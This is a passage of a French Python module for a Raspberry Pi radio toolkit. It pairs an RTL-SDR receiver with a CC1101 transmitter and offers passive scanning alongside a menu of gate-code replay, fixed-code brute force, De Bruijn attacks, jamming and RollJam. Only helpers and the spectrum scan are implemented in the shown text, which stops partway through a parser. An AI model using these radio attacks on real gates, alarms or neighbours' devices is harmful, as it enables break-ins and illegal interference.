"""
Module SDR — RTL-SDR v5 (réception) + CC1101 E07-M1101D (émission sub-GHz).

Actions branchées :
  Reconnaissance passive (RTL-SDR) :
    - scan_spectrum    : analyseur de spectre (rtl_power) sur une plage.
    - rtl433_listen    : décodage automatique 250+ protocoles (433/868 MHz).
    - detect_signals   : détection rapide de signaux actifs dans les bandes ISM.
    - adsb             : tracking avions (dump1090, 1090 MHz).
    - fm_listen        : récepteur FM broadcast.

  Flipper — Capture & Replay (RTL-SDR → CC1101) :
    - flipper_read     : scan + détection + préparation replay (mode Flipper).
    - flipper_send     : réémet un signal capturé via CC1101 (lab-gated).

  Capture (RTL-SDR) :
    - capture_iq       : capture IQ brute à une fréquence donnée.
    - record_signal    : enregistrement d'un signal sub-GHz (fichier .raw).
    - analyze_signal   : analyse de protocole inconnu (rtl_433 -A).

  Actif · Émission (CC1101, lab-gated) :
    - replay           : rejoue un signal capturé.
    - bruteforce       : brute force de codes fixes (OOK).
    - debruijn         : séquence De Bruijn optimisée.
    - transmit_custom  : transmission arbitraire.

  Rogue (CC1101, lab-gated) :
    - jamming          : brouillage d'une fréquence.
    - rolljam          : jam + capture de rolling codes (RTL-SDR + CC1101).

Notes d'implémentation :
  - RTL-SDR détecté via lsusb (Realtek 0bda:2838).
  - CC1101 détecté via SPI (/dev/spidev0.0 + lecture registre VERSION).
  - Les actions CC1101 retournent une erreur explicite si le module n'est
    pas connecté (permet de coder maintenant, tester plus tard).
  - Captures stockées dans /tmp/nexuspi/sdr/, archivées via core/memory.
"""
import json
import os
import re
import select as _sel
import shutil
import signal
import subprocess
import sys
import time
import traceback
from html import escape
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.base_module import BaseModule, Action
from core import memory
from core.tasks import current_task


# ── Répertoires de travail ─────────────────────────────────────────────────

SDR_DIR = Path("/tmp/nexuspi/sdr")
SPECTRUM_CSV = SDR_DIR / "spectrum.csv"
RTL433_JSON = SDR_DIR / "rtl433.json"
CAPTURE_DIR = SDR_DIR / "captures"
ADSB_DIR = SDR_DIR / "adsb"

# Persistance
DATA_DIR = Path.home() / "nexuspi-data" / "sdr"


# ── Helpers ────────────────────────────────────────────────────────────────

def _run(cmd: List[str], timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True,
                          errors="replace", timeout=timeout)


def _run_live(cmd: List[str], timeout: int, on_line=None) -> str:
    """Exécute une commande avec lecture temps réel du stdout.

    Appelle `on_line(line)` pour chaque ligne de stdout.
    Retourne tout le stdout accumulé à la fin.
    """
    import select as _sel
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    all_stdout = []
    start = time.time()
    while proc.poll() is None and time.time() - start < timeout:
        _check_stop()
        try:
            if _sel.select([proc.stdout], [], [], 0.5)[0]:
                line = proc.stdout.readline()
                if line:
                    all_stdout.append(line)
                    if on_line:
                        on_line(line.strip())
            else:
                time.sleep(0.3)
        except Exception:
            time.sleep(0.5)
    # Drainer les lignes restantes après la fin du process
    for line in proc.stdout:
        all_stdout.append(line)
        if on_line:
            on_line(line.strip())
    proc.wait(timeout=5)
    return "".join(all_stdout)


def _which(name: str) -> bool:
    return shutil.which(name) is not None


def _clean_sdr_dir() -> None:
    SDR_DIR.mkdir(parents=True, exist_ok=True)


def _ensure_capture_dir() -> Path:
    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    return CAPTURE_DIR


def _detect_rtlsdr() -> bool:
    """Vérifie la présence d'un dongle RTL-SDR via lsusb."""
    try:
        res = _run(["lsusb"], timeout=5)
        return "0bda:2838" in (res.stdout or "")
    except Exception:
        return False


def _detect_cc1101() -> bool:
    """Vérifie la présence du CC1101 via SPI (lecture registre VERSION)."""
    if not Path("/dev/spidev0.0").exists():
        return False
    try:
        res = _run(["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3", "-c",
                     "import spidev,time;s=spidev.SpiDev();s.open(0,0);"
                     "s.max_speed_hz=55000;s.mode=0;s.xfer2([0x30]);"
                     "time.sleep(0.01);r=s.xfer2([0x31|0xC0,0x00]);"
                     "s.close();print(r[1])"], timeout=5)
        version = int((res.stdout or "0").strip())
        return version == 0x14  # CC1101 VERSION = 0x14
    except Exception:
        return False


def _check_stop() -> None:
    """Vérifie si l'utilisateur a demandé l'arrêt de la tâche."""
    task = current_task()
    if task and task.is_stopped():
        raise _StopRequested()


class _StopRequested(Exception):
    pass


def _log(msg: str, level: str = "info") -> None:
    """Log via le système de tâches (visible par le front) ou print en fallback."""
    task = current_task()
    if task:
        task.log(msg, level=level)
    else:
        print(msg, flush=True)


def _freq_display(hz: str) -> str:
    """Convertit une fréquence en affichage lisible."""
    try:
        f = float(hz)
        if f >= 1e9:
            return f"{f/1e9:.3f} GHz"
        elif f >= 1e6:
            return f"{f/1e6:.2f} MHz"
        elif f >= 1e3:
            return f"{f/1e3:.1f} kHz"
        return f"{f:.0f} Hz"
    except (ValueError, TypeError):
        return str(hz)


def _resolve_freq_int(p: Dict, name: str = "frequency",
                      default: int = 433920000) -> int:
    """Wrapper : _resolve_freq → int. Plage → borne basse. Sûr pour int()."""
    val = _resolve_freq(p, name, str(default))
    if val.startswith("_range:"):
        return int(val[7:].split("-")[0])
    if val == "_all_ism":
        return default
    try:
        return int(val)
    except (ValueError, TypeError):
        return default


def _freq_to_hz(val: str) -> int:
    """Convertit une valeur brute en Hz (int). Accepte MHz, suffixes, Hz."""
    low = val.strip().lower().rstrip("hz")
    if low.endswith("g"):
        return int(float(low[:-1]) * 1e9)
    if low.endswith("m"):
        return int(float(low[:-1]) * 1e6)
    if low.endswith("k"):
        return int(float(low[:-1]) * 1e3)
    f = float(low)
    if f < 10000:  # < 10 kHz → probablement des MHz
        return int(f * 1e6)
    return int(f)


def _resolve_freq(p: Dict, name: str = "frequency", default: str = "433920000") -> str:
    """Résout un param de type 'freq' → Hz en string.

    Gère les presets (déjà en Hz), le mode personnalisé (_custom),
    et les plages (ex: "433-439" → "_range:433000000-439000000").
    """
    val = p.get(name, default)
    if val == "_all_ism":
        return "_all_ism"
    if val == "_custom":
        val = p.get(f"{name}_custom", default)
    val = str(val).strip()
    # Plage ? (ex: "433-439", "433M-439M", "868.0-868.8")
    if "-" in val and not val.startswith("-"):
        parts = val.split("-", 1)
        if len(parts) == 2:
            try:
                lo = _freq_to_hz(parts[0])
                hi = _freq_to_hz(parts[1])
                if lo > 0 and hi > lo:
                    return f"_range:{lo}-{hi}"
            except (ValueError, TypeError):
                pass
    # Valeur unique
    try:
        return str(_freq_to_hz(val))
    except (ValueError, TypeError):
        return default


def _energy_bar(peak: int) -> str:
    """Barre d'énergie visuelle (peak = déviation 0-128)."""
    filled = min(10, max(0, (peak - 2) * 10 // 80))
    return "█" * filled + "░" * (10 - filled)


def _read_energy(path: Path, last_pos: int) -> tuple:
    """Lit l'énergie du fichier IQ en cours d'écriture.

    Les échantillons RTL-SDR sont des uint8, centre = 128.
    Retourne (peak, avg, new_pos).
    """
    try:
        if not path.exists():
            return 0, 0.0, last_pos
        size = path.stat().st_size
        if size < last_pos + 5000:
            return 0, 0.0, last_pos
        with open(path, 'rb') as f:
            f.seek(max(0, size - 10000))
            chunk = f.read()
        if not chunk:
            return 0, 0.0, size
        devs = [abs(b - 128) for b in chunk]
        return max(devs), sum(devs) / len(devs), size
    except Exception:
        return 0, 0.0, last_pos


# ── Module SDR ─────────────────────────────────────────────────────────────

class SdrModule(BaseModule):
    id = "sdr"
    name = "SDR · Sub-GHz"
    icon = "📡"
    description = "RTL-SDR (réception) + CC1101 (émission sub-GHz)"

    def __init__(self):
        self._last_signals: List[Dict] = []
        self._last_spectrum: List[Dict] = []
        self._last_adsb: List[Dict] = []
        self._captured_signals: List[Dict] = []  # signaux capturés (replay)
        self._ambient_keys: set = set()  # clés ambiantes persistantes
        self._rtlsdr_ok: Optional[bool] = None
        self._cc1101_ok: Optional[bool] = None

    # ── detect / state ─────────────────────────────────────────────────

    def detect(self) -> bool:
        self._rtlsdr_ok = _detect_rtlsdr()
        self._cc1101_ok = _detect_cc1101()
        return self._rtlsdr_ok or self._cc1101_ok

    def state(self) -> Dict[str, Any]:
        return {
            "rtlsdr": self._rtlsdr_ok,
            "cc1101": self._cc1101_ok,
            "last_signals": self._last_signals[-20:],
            "last_adsb": self._last_adsb[-10:],
            "captured_signals": self._captured_signals[-20:],
            "signal_files": self._list_signal_files(),
            "ambient_count": len(self._ambient_keys),
        }

    def _list_signal_files(self) -> List[Dict]:
        """Liste les fichiers de signaux capturés."""
        files = []
        seen = set()
        for d in [CAPTURE_DIR, DATA_DIR]:
            if not d.exists():
                continue
            for f in sorted(d.glob("*.raw")) + sorted(d.glob("*.iq")):
                if f.name in seen:
                    continue
                seen.add(f.name)
                # Extraire nom et fréquence du fichier
                # Format : [nom_]freq_timestamp.raw
                parts = f.stem.split("_")
                label = ""
                freq_str = "?"
                # Chercher la partie fréquence (nombre > 1 MHz)
                for i, part in enumerate(parts):
                    if part.isdigit() and int(part) > 1_000_000:
                        freq_str = part
                        # Tout ce qui précède = le nom
                        label = " ".join(parts[:i]).replace("_", " ")
                        break
                files.append({
                    "name": f.name,
                    "label": label,
                    "path": str(f),
                    "size": f.stat().st_size,
                    "freq": freq_str,
                })
        return files[-20:]

    # ── actions ────────────────────────────────────────────────────────

    def actions(self) -> List[Action]:
        # Presets de fréquences sub-GHz réutilisables
        FREQ_SUB_GHZ = [
            {"value": "_all_ism", "label": "Balayage toutes bandes",
             "hint": "433 · 433.42 · 868 · 315 MHz en rotation"},
            {"value": "433920000", "label": "433.92 MHz",
             "hint": "Portails · Télécommandes · Domotique"},
            {"value": "433420000", "label": "433.42 MHz",
             "hint": "Somfy RTS · Volets roulants · K-Line"},
            {"value": "868350000", "label": "868.35 MHz",
             "hint": "Alarmes · Capteurs IoT Europe"},
            {"value": "315000000", "label": "315 MHz",
             "hint": "Garage US · Télécommandes Asie"},
            {"value": "27145000", "label": "27.145 MHz",
             "hint": "Jouets RC · CB"},
            {"value": "_custom", "label": "Personnalisé…"},
        ]

        return [
            # ── PASSIVE (RTL-SDR) ──
            Action(
                id="scan_spectrum",
                label="Scanner le spectre",
                phase="passive",
                description="Visualise l'activité radio autour de toi — trouve les fréquences actives.",
                hint="Ex : détecter la fréquence d'un portail, repérer un émetteur",
                params=[
                    {"name": "band", "label": "Zone à scanner",
                     "type": "select",
                     "options": [
                         {"value": "433", "label": "433 MHz — Portails & domotique"},
                         {"value": "868", "label": "868 MHz — Alarmes & IoT"},
                         {"value": "315", "label": "315 MHz — Garage US"},
                         {"value": "fm", "label": "FM — Radio broadcast"},
                         {"value": "full", "label": "Large — Scanner tout (lent)"},
                         {"value": "_custom", "label": "Personnalisé…"},
                     ]},
                    {"name": "band_custom", "label": "Plage (MHz)",
                     "type": "text", "placeholder": "ex: 430-440",
                     "show_if": {"band": "_custom"}},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "15", "label": "15s — Rapide"},
                         {"value": "30", "label": "30s — Normal"},
                         {"value": "60", "label": "1 min — Détaillé"},
                         {"value": "180", "label": "3 min — Précis"},
                     ]},
                ],
            ),
            Action(
                id="rtl433_listen",
                label="Écouter les appareils",
                phase="passive",
                description="Décode automatiquement les signaux : sondes météo, capteurs de pneus, portails, alarmes…",
                hint="Ex : voir les sondes météo des voisins, capter les TPMS de voitures",
                params=[
                    {"name": "frequency", "label": "Fréquence",
                     "type": "freq", "options": FREQ_SUB_GHZ[:5] + [
                         {"value": "_custom", "label": "Personnalisé…",
                          "hint": "Fréquence ou plage (ex: 433.42, 433-439)"},
                     ]},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "30", "label": "30s — Aperçu rapide"},
                         {"value": "60", "label": "1 min — Recommandé"},
                         {"value": "180", "label": "3 min — Écoute longue"},
                         {"value": "600", "label": "10 min — Surveillance"},
                     ]},
                ],
            ),
            Action(
                id="detect_signals",
                label="Détecter les émissions",
                phase="passive",
                description="Scan rapide pour trouver qui émet autour de toi.",
                hint="Ex : quelqu'un appuie sur une télécommande ? Ça apparaît ici",
                params=[
                    {"name": "band", "label": "Bande",
                     "type": "select",
                     "options": [
                         {"value": "ism433", "label": "433 MHz — Portails & domotique"},
                         {"value": "ism868", "label": "868 MHz — Alarmes & IoT"},
                         {"value": "ism315", "label": "315 MHz — Garage US"},
                         {"value": "all", "label": "Toutes les bandes"},
                     ]},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "10", "label": "10s — Flash"},
                         {"value": "20", "label": "20s — Normal"},
                         {"value": "60", "label": "1 min — Écoute patiente"},
                     ]},
                ],
            ),
            Action(
                id="adsb",
                label="Radar avions",
                phase="passive",
                description="Capte les transpondeurs ADS-B des avions en vol au-dessus de toi.",
                hint="Position, altitude, vitesse, compagnie — comme FlightRadar24 en local",
                params=[
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "30", "label": "30s — Aperçu"},
                         {"value": "60", "label": "1 min — Recommandé"},
                         {"value": "180", "label": "3 min — Surveillance"},
                     ]},
                ],
            ),
            Action(
                id="fm_listen",
                label="Radio FM",
                phase="passive",
                description="Écoute une station de radio FM.",
                hint="Démo de réception radio — le son est enregistré sur le Pi",
                params=[
                    {"name": "frequency", "label": "Station",
                     "type": "select",
                     "options": [
                         {"value": "87.8", "label": "87.8 — France Inter"},
                         {"value": "90.9", "label": "90.9 — Chérie FM"},
                         {"value": "96.0", "label": "96.0 — Skyrock"},
                         {"value": "100.3", "label": "100.3 — NRJ"},
                         {"value": "105.5", "label": "105.5 — France Info"},
                         {"value": "_custom", "label": "Autre fréquence…"},
                     ]},
                    {"name": "freq_custom", "label": "Fréquence (MHz)",
                     "type": "text", "placeholder": "ex: 96.0",
                     "show_if": {"frequency": "_custom"}},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "10", "label": "10s — Test rapide"},
                         {"value": "30", "label": "30s — Écoute"},
                         {"value": "60", "label": "1 min"},
                     ]},
                ],
            ),
            # ── FLIPPER (RTL-SDR → CC1101) ──
            Action(
                id="flipper_read",
                label="Capturer & Rejouer",
                phase="capture",
                description="Mode Flipper : détecte tout signal radio (connu ou inconnu) et prépare le replay instantané.",
                hint="Appuie sur ta télécommande → signal capturé → bouton Rejouer",
                params=[
                    {"name": "frequency", "label": "Fréquence",
                     "type": "freq", "options": FREQ_SUB_GHZ[:5] + [
                         {"value": "_custom", "label": "Personnalisé…",
                          "hint": "Fréquence ou plage (ex: 433.42, 433-439)"},
                     ]},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "30", "label": "30s — Rapide"},
                         {"value": "60", "label": "1 min — Recommandé"},
                         {"value": "180", "label": "3 min — Écoute longue"},
                     ]},
                ],
            ),
            Action(
                id="flipper_send",
                label="Rejouer (Flipper)",
                phase="active",
                lab_gated=True,
                description="Réémet un signal capturé via CC1101 — code fixe uniquement.",
                hint="⚠️ Ne fonctionne pas sur le rolling code (portails modernes)",
                params=[
                    {"name": "code", "label": "Code (hex)",
                     "type": "text",
                     "placeholder": "ex: 000000080b21272d"},
                    {"name": "frequency", "label": "Fréquence",
                     "type": "freq", "options": FREQ_SUB_GHZ[1:5] + [
                         {"value": "_custom", "label": "Personnalisé…"},
                     ]},
                    {"name": "modulation", "label": "Modulation",
                     "type": "select",
                     "options": [
                         {"value": "OOK_MC", "label": "OOK Manchester"},
                         {"value": "OOK_RAW", "label": "OOK brut (sans encodage)"},
                     ]},
                    {"name": "short_us", "label": "Pulse (µs)",
                     "type": "text", "default": "500",
                     "placeholder": "ex: 474"},
                    {"name": "repeat", "label": "Répétitions",
                     "type": "select",
                     "options": [
                         {"value": "3", "label": "3×"},
                         {"value": "5", "label": "5× — Recommandé"},
                         {"value": "10", "label": "10×"},
                         {"value": "20", "label": "20× (insistant)"},
                     ]},
                ],
            ),
            # ── CAPTURE (RTL-SDR) ──
            Action(
                id="capture_iq",
                label="Capturer un signal (IQ)",
                phase="capture",
                description="Capture brute d'un signal radio pour analyse avancée ou replay.",
                hint="Ex : enregistrer le signal d'un portail pour l'étudier ensuite",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "sample_rate", "label": "Précision",
                     "type": "select",
                     "options": [
                         {"value": "250000", "label": "Étroit — signal simple (portail)"},
                         {"value": "1024000", "label": "Moyen — signal complexe"},
                         {"value": "2048000", "label": "Large — capture tout"},
                     ]},
                    {"name": "gain", "label": "Sensibilité",
                     "type": "select",
                     "options": [
                         {"value": "20", "label": "Faible — émetteur proche"},
                         {"value": "40", "label": "Normal — recommandé"},
                         {"value": "50", "label": "Maximum — émetteur loin"},
                     ]},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "5", "label": "5s — Signal court (bip)"},
                         {"value": "10", "label": "10s — Normal"},
                         {"value": "30", "label": "30s — Signal long"},
                     ]},
                ],
            ),
            Action(
                id="record_signal",
                label="Enregistrer pour replay",
                phase="capture",
                description="Enregistre un signal sub-GHz pour le rejouer plus tard.",
                hint="Ex : enregistrer un portail, une sonnette, une télécommande",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "gain", "label": "Sensibilité",
                     "type": "select",
                     "options": [
                         {"value": "49", "label": "Maximum — recommandé"},
                         {"value": "40", "label": "Haute — émetteur proche"},
                         {"value": "30", "label": "Moyenne"},
                         {"value": "20", "label": "Faible — évite la saturation"},
                     ]},
                    {"name": "duration", "label": "Durée d'écoute",
                     "type": "select",
                     "options": [
                         {"value": "5", "label": "5s — Signal court (bip)"},
                         {"value": "10", "label": "10s — Recommandé"},
                         {"value": "30", "label": "30s — Plusieurs appuis"},
                     ]},
                ],
            ),
            Action(
                id="analyze_signal",
                label="Identifier un protocole",
                phase="capture",
                description="Tente de décoder un signal inconnu et affiche sa structure.",
                hint="Ex : identifier si un portail utilise un code fixe ou rolling code",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "duration", "label": "Durée d'analyse",
                     "type": "select",
                     "options": [
                         {"value": "15", "label": "15s — Rapide"},
                         {"value": "30", "label": "30s — Recommandé"},
                         {"value": "60", "label": "1 min — Analyse profonde"},
                     ]},
                ],
            ),
            # ── ACTIF (CC1101, lab-gated) ──
            Action(
                id="replay",
                label="Rejouer un signal",
                phase="active",
                description="Réémet un signal capturé — ouvre un portail, une barrière, une sonnette…",
                hint="⚠ Fonctionne uniquement sur les codes fixes (pas rolling code)",
                params=[
                    {"name": "signal_file", "label": "Signal enregistré",
                     "type": "signal_file"},
                    {"name": "frequency", "label": "Fréquence d'émission",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "repeat", "label": "Répétitions",
                     "type": "select",
                     "options": [
                         {"value": "3", "label": "3× — Normal"},
                         {"value": "5", "label": "5× — Recommandé"},
                         {"value": "10", "label": "10× — Insister"},
                         {"value": "30", "label": "30× — Brut force"},
                     ]},
                ],
            ),
            Action(
                id="bruteforce",
                label="Brute force codes fixes",
                phase="active",
                description="Teste toutes les combinaisons possibles d'un code fixe.",
                hint="Ex : ouvrir un vieux portail sans télécommande (codes 12 bits = 4096 essais)",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "bits", "label": "Taille du code",
                     "type": "select",
                     "options": [
                         {"value": "8", "label": "8 bits — 256 codes (rapide)"},
                         {"value": "12", "label": "12 bits — 4096 codes (classique)"},
                         {"value": "16", "label": "16 bits — 65 536 codes (long)"},
                         {"value": "20", "label": "20 bits — 1M codes (très long)"},
                     ]},
                    {"name": "baudrate", "label": "Débit",
                     "type": "select",
                     "options": [
                         {"value": "1000", "label": "1000 baud — Lent & fiable"},
                         {"value": "2000", "label": "2000 baud — Standard"},
                         {"value": "5000", "label": "5000 baud — Rapide"},
                     ]},
                ],
            ),
            Action(
                id="debruijn",
                label="De Bruijn (brute force rapide)",
                phase="active",
                description="Brute force optimisé — teste tous les codes en une seule séquence.",
                hint="~10× plus rapide que le brute force classique",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "bits", "label": "Taille du code",
                     "type": "select",
                     "options": [
                         {"value": "8", "label": "8 bits — 256 codes"},
                         {"value": "12", "label": "12 bits — 4096 codes"},
                         {"value": "16", "label": "16 bits — 65 536 codes"},
                     ]},
                ],
            ),
            Action(
                id="transmit_custom",
                label="Émission libre",
                phase="active",
                description="Envoie des données personnalisées sur une fréquence.",
                hint="Mode avancé — tu choisis la modulation et les données brutes",
                params=[
                    {"name": "frequency", "label": "Fréquence",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "modulation", "label": "Modulation",
                     "type": "select",
                     "options": [
                         {"value": "OOK", "label": "OOK — Portails, télécommandes"},
                         {"value": "2FSK", "label": "2-FSK — Capteurs, IoT"},
                         {"value": "GFSK", "label": "GFSK — Bluetooth-like"},
                         {"value": "MSK", "label": "MSK — Avancé"},
                     ]},
                    {"name": "data_hex", "label": "Données (hex)",
                     "type": "text", "default": "AABB0102",
                     "placeholder": "ex: AABB0102"},
                    {"name": "repeat", "label": "Répétitions",
                     "type": "select",
                     "options": [
                         {"value": "1", "label": "1× — Test"},
                         {"value": "3", "label": "3× — Normal"},
                         {"value": "10", "label": "10× — Insister"},
                     ]},
                ],
            ),
            Action(
                id="test_tx",
                label="Tester l'émetteur",
                phase="active",
                description="Vérifie que le CC1101 émet un signal RF — le RTL-SDR écoute en même temps.",
                hint="Confirme que le matériel fonctionne avant de debugger un replay",
                params=[
                    {"name": "frequency", "label": "Fréquence de test",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                ],
            ),
            # ── ROGUE (CC1101, lab-gated) ──
            Action(
                id="jamming",
                label="Brouillage radio",
                phase="rogue",
                description="Bloque les communications sur une fréquence donnée.",
                hint="⚠ Empêche portails, alarmes, télécommandes de fonctionner",
                params=[
                    {"name": "frequency", "label": "Fréquence à brouiller",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "duration", "label": "Durée",
                     "type": "select",
                     "options": [
                         {"value": "10", "label": "10s — Test"},
                         {"value": "30", "label": "30s — Normal"},
                         {"value": "60", "label": "1 min — Prolongé"},
                     ]},
                ],
            ),
            Action(
                id="rolljam",
                label="RollJam (jam + vol de code)",
                phase="rogue",
                description="Brouille le signal pendant qu'il capture le code rolling — attaque avancée.",
                hint="Combine RTL-SDR (capture) + CC1101 (brouillage) simultanément",
                params=[
                    {"name": "frequency", "label": "Fréquence cible",
                     "type": "freq", "options": FREQ_SUB_GHZ},
                    {"name": "duration", "label": "Durée de capture",
                     "type": "select",
                     "options": [
                         {"value": "30", "label": "30s — Rapide"},
                         {"value": "60", "label": "1 min — Recommandé"},
                         {"value": "180", "label": "3 min — Patient"},
                     ]},
                ],
            ),
        ]

    # ── Dispatcher ─────────────────────────────────────────────────────

    def run(self, action_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        _clean_sdr_dir()
        try:
            dispatch = {
                # Passive (RTL-SDR)
                "scan_spectrum":  self._scan_spectrum,
                "rtl433_listen":  self._rtl433_listen,
                "detect_signals": self._detect_signals,
                "adsb":           self._adsb,
                "fm_listen":      self._fm_listen,
                # Flipper (RTL-SDR → CC1101)
                "flipper_read":   self._flipper_read,
                "flipper_send":   self._flipper_send,
                # Capture (RTL-SDR)
                "capture_iq":     self._capture_iq,
                "record_signal":  self._record_signal,
                "analyze_signal": self._analyze_signal,
                # Actif (CC1101)
                "replay":          self._replay,
                "bruteforce":      self._bruteforce,
                "debruijn":        self._debruijn,
                "transmit_custom": self._transmit_custom,
                "test_tx":         self._test_tx,
                # Rogue (CC1101)
                "jamming":  self._jamming,
                "rolljam":  self._rolljam,
                # Gestion des signaux (appelés depuis le front, pas dans actions())
                "rename_signal": self._rename_signal,
                "delete_signal": self._delete_signal,
            }
            fn = dispatch.get(action_id)
            if not fn:
                return {"ok": False, "error": f"action '{action_id}' inconnue"}
            return fn(params)
        except _StopRequested:
            return {"ok": True, "log": "Arrêté par l'utilisateur."}
        except Exception as e:
            traceback.print_exc()
            return {"ok": False, "error": str(e)}

    # ════════════════════════════════════════════════════════════════════
    #  PASSIVE — RTL-SDR
    # ════════════════════════════════════════════════════════════════════

    def _scan_spectrum(self, p: Dict) -> Dict:
        """rtl_power : balaie une plage et génère un CSV de puissance."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}
        if not _which("rtl_power"):
            return {"ok": False, "error": "rtl_power non installé"}

        # Résolution de la bande à scanner
        band_presets = {
            "433":  ("430M", "440M",  "433 MHz — Portails & domotique"),
            "868":  ("860M", "870M",  "868 MHz — Alarmes & IoT"),
            "315":  ("310M", "320M",  "315 MHz — Garage US"),
            "fm":   ("87M",  "108M",  "FM — Radio broadcast"),
            "full": ("24M",  "1700M", "Spectre complet"),
        }
        band = p.get("band", "433")
        if band == "_custom":
            custom = p.get("band_custom", "430-440")
            parts = custom.replace(" ", "").split("-")
            freq_start = parts[0].strip() + "M" if "M" not in parts[0] else parts[0]
            freq_end = (parts[1].strip() + "M" if "M" not in parts[1] else parts[1]) if len(parts) > 1 else freq_start
            band_label = f"{freq_start}→{freq_end}"
        else:
            preset = band_presets.get(band, band_presets["433"])
            freq_start, freq_end, band_label = preset

        duration = int(p.get("duration", 30))

        out_csv = SDR_DIR / "spectrum.csv"
        cmd = [
            "sudo", "timeout", str(duration),
            "rtl_power",
            "-f", f"{freq_start}:{freq_end}:25k",
            "-g", "40",
            "-i", "1",
            str(out_csv),
        ]
        _log(f"🔍 Scan du spectre <b>{band_label}</b>…")
        _log(f"   Plage {freq_start}→{freq_end} · durée {duration}s")
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        start = time.time()
        while proc.poll() is None and time.time() - start < duration + 5:
            _check_stop()
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed % 10 == 0 and elapsed > 0:
                pct = min(100, int(elapsed / duration * 100))
                _log(f"📊 Scan en cours… {elapsed}/{duration}s ({pct}%)")

        if proc.poll() is None:
            proc.terminate()
            proc.wait(timeout=5)

        results = self._parse_spectrum_csv(out_csv)
        self._last_spectrum = results

        if not results:
            _log("📭 Aucune activité radio dans cette plage.", "warn")
            _log("   La bande est silencieuse — essaie une plage plus large "
                 "ou une durée plus longue.")
            return {"ok": True, "signals": 0,
                    "message": f"Bande {band_label} silencieuse."}

        # ── Plancher de bruit (médiane) ──
        all_powers = sorted(r["power_max"] for r in results)
        n = len(all_powers)
        noise_floor = (all_powers[n // 2] if n % 2
                       else (all_powers[n // 2 - 1] + all_powers[n // 2]) / 2)
        THRESHOLD = 6  # dB au-dessus du plancher = vrai signal
        _log(f"📊 Plancher de bruit : <b>{noise_floor:.0f} dB</b> "
             f"(seuil : +{THRESHOLD} dB)")

        # Filtrer : garder seulement ce qui dépasse le bruit
        active = [r for r in results
                  if r["power_max"] >= noise_floor + THRESHOLD]

        if not active:
            _log("📭 Aucun signal au-dessus du bruit de fond.")
            _log(f"   Tout est entre {all_powers[0]:.0f} et "
                 f"{all_powers[-1]:.0f} dB — c'est du bruit ambiant.")
            return {"ok": True, "signals": 0,
                    "message": f"Bande {band_label} : que du bruit."}

        # ── Regrouper les fréquences proches (< 100 kHz = même source) ──
        sorted_a = sorted(active, key=lambda x: x["power_max"],
                          reverse=True)
        clusters: List[Dict] = []
        used: set = set()
        for s in sorted_a:
            fhz = s["freq_hz"]
            if fhz in used:
                continue
            neighbors = [r for r in active
                         if abs(r["freq_hz"] - fhz) < 100_000
                         and r["freq_hz"] not in used]
            for nb in neighbors:
                used.add(nb["freq_hz"])
            best = max(neighbors, key=lambda x: x["power_max"])
            clusters.append(best)
            if len(clusters) >= 30:
                break

        _log(f"📶 <b>{len(clusters)} signal(aux) réel(s)</b> "
             f"(sur {n} bins analysés) :")

        # Construire les cartes spectre pour le frontend
        spec_cards = []
        for i, s in enumerate(clusters):
            above = s["power_max"] - noise_floor
            bar = "█" * max(1, min(20, int(above)))
            lvl = ("fort" if above > 15
                   else "moyen" if above > 8
                   else "faible")
            freq_hz = int(s["freq_hz"])
            spec_cards.append({
                "freq_hz": freq_hz,
                "freq_display": _freq_display(str(freq_hz)),
                "power": round(s["power_max"], 1),
                "above_noise": round(above, 1),
                "level": lvl,
                "samples": s["samples"],
            })
            _log(f"   {i+1}. <b>{_freq_display(str(freq_hz))}</b> "
                 f"· {s['power_max']:.0f} dB · <b>+{above:.0f}</b> "
                 f"au-dessus du bruit · {lvl}  {bar}")

        # Stream pour le frontend
        _log(f"__SPECTRUM_LIVE__{json.dumps(spec_cards)}")

        return {
            "ok": True,
            "signals": len(clusters),
            "noise_floor": round(noise_floor, 1),
            "top": spec_cards[:10],
            "message": f"{len(clusters)} signal(aux) réel(s) dans "
                       f"{band_label}.",
        }

    def _parse_spectrum_csv(self, path: Path) -> List[Dict]:
        """Parse le CSV rtl_power et agrège par fréquence."""
        if not path.exists():
            return []
        freq_power: Dict[float, List[float]] = {}
        try:
            for line in path.read_text(errors="replace").strip().split("\n"):
                parts = line.split(",")
                if len(parts) < 7:
                    continue
                try:
                    freq_low = float(parts[2])
                    freq_step = float(parts[4])
                    samples = [float(x) for x in parts[6:] if x.strip()]
                    for i, pwr in enumerate(samples):
                        freq = freq_low + i * freq_step
                        freq_power.setdefault(freq, []).append(pwr)
                except (ValueError, IndexError):
                    continue
        except Exception:
